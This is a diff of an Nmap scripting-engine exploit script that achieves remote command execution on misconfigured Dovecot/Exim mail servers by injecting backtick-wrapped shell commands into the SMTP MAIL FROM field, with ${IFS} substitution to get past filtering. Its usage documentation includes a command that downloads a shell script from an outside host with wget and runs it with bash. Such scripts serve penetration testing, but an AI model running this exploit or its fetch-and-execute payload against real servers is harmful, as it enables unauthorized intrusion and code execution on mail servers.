@@ -1,14 +1,27 @@
 description = [[
 Attempts to exploit a remote command execution vulnerability in misconfigured Dovecot/Exim mail servers.
+
+It is important to note that the mail server will not return the output of the command. The mail server 
+also wont allow space characters but they can be replaced with "${IFS}". Commands can also be 
+concatenated with "``". The script takes care of the conversion automatically.
+
+References:
+* https://www.redteam-pentesting.de/en/advisories/rt-sa-2013-001/-exim-with-dovecot-typical-misconfiguration-leads-to-remote-command-execution
+* CVE not available yet
 ]]
 
 ---
--- @usage
--- 
--- @output
+-- @usage nmap -sV --script smtp-dovecot-exim-exec --script-args smtp-dovecot-exim-exec.cmd="uname -a" <target>
+-- @usage nmap -p586 --script smtp-dovecot-exim-exec --script-args smtp-dovecot-exim-exec.cmd="wget -O /tmp/p example.com/test.sh;bash /tmp/p" <target>
 --
--- @args 
---
+-- @args smtp-dovecot-exim-exec.cmd Command to execute. Separate commands with ";".
+-- @args smtp-dovecot-exim-exec.auth Authentication scheme (Optional).
+-- @args smtp-dovecot-exim-exec.user Authentication username (Optional).
+-- @args smtp-dovecot-exim-exec.pwd Authentication password (Optional).
+-- @args smtp-dovecot-exim-exec.from Email address to use in the FROM field. Default: nmap+domain. (Optional).
+-- @args smtp-dovecot-exim-exec.to Email address to use in the TO field. Default: nmap@mailinator.com
+-- @args smtp-dovecot-exim-exec.timeout Timeout value. Default: 8000. (Optional)
+-- @args smtp-dovecot-exim-exec.domain Domain name to use. It attempts to set this field automatically. (Optional)
 ---
 
 author = "Paulino Calderon <calderon@websec.mx>"
@@ -27,7 +40,7 @@ portrule = shortport.port_or_service({25, 465, 587},
 action = function(host, port)
   local cmd = stdnse.get_script_args(SCRIPT_NAME..".cmd") or "uname"
   --Prepare payload
-  cmd = string.gsub(cmd, " ", "{IFS}")
+  cmd = string.gsub(cmd, " ", "${IFS}")
   cmd = string.gsub(cmd, ";", "``")
   
   local user = stdnse.get_script_args(SCRIPT_NAME..".user") or nil
@@ -66,7 +79,6 @@ action = function(host, port)
 
   --Sends MAIL cmd and injects malicious payload
   local from_frags =  stdnse.strsplit("@", from)
-  print(from_frags[2])
   local malicious_from_field = from_frags[1].."`"..cmd.."`@"..from_frags[2]
   stdnse.print_debug(1, "%s:Setting malicious MAIL FROM field to:%s", SCRIPT_NAME, malicious_from_field)
   status, resp = smtp.mail(smtp_conn, malicious_from_field)
@@ -87,7 +99,7 @@ action = function(host, port)
   if status then
     return string.format("Malicious payload delivered:%s", resp)
   else
-    stdnse.print_debug(1, "Payload could not be delivered:%s", resp) 
+    stdnse.print_debug(1, "%s:Payload could not be delivered:%s", SCRIPT_NAME, resp) 
   end
   return nil
  end
